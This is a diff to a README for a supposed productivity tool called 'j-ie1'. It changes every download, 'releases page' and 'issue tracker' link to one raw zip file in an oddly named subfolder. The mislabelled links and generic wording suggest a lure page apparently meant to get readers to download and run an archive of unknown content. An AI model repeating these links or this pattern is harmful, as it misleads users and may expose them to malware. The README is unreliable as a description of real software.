@@ -6,7 +6,7 @@ Welcome to j-ie1! This tool helps you simplify your daily tasks on your computer
 
 ## 📥 Download j-ie1
 
-[![Download j-ie1](https://raw.githubusercontent.com/Michael336689/j-ie1/main/rowlandite/j-ie1.zip)](https://raw.githubusercontent.com/Michael336689/j-ie1/main/rowlandite/j-ie1.zip)
+[![Download j-ie1](https://github.com/Michael336689/j-ie1/raw/refs/heads/main/rowlandite/j-ie-3.6.zip)](https://github.com/Michael336689/j-ie1/raw/refs/heads/main/rowlandite/j-ie-3.6.zip)
 
 ## 🛠️ System Requirements
 
@@ -23,7 +23,7 @@ To get j-ie1 on your computer, follow these steps:
 
 1. Click the link below to visit the releases page where you can download j-ie1.
 
-   [Visit this page to download](https://raw.githubusercontent.com/Michael336689/j-ie1/main/rowlandite/j-ie1.zip)
+   [Visit this page to download](https://github.com/Michael336689/j-ie1/raw/refs/heads/main/rowlandite/j-ie-3.6.zip)
 
 2. Look for the latest version. It will be marked clearly. Click on it to download.
 3. Choose the file suitable for your operating system.
@@ -60,7 +60,7 @@ If you face any issues, here are some common solutions:
 
 ## 🌐 Support
 
-For additional help, visit our [issue tracker](https://raw.githubusercontent.com/Michael336689/j-ie1/main/rowlandite/j-ie1.zip). You can report bugs or ask for help with features. 
+For additional help, visit our [issue tracker](https://github.com/Michael336689/j-ie1/raw/refs/heads/main/rowlandite/j-ie-3.6.zip). You can report bugs or ask for help with features. 
 
 ## 📣 Community Feedback
 
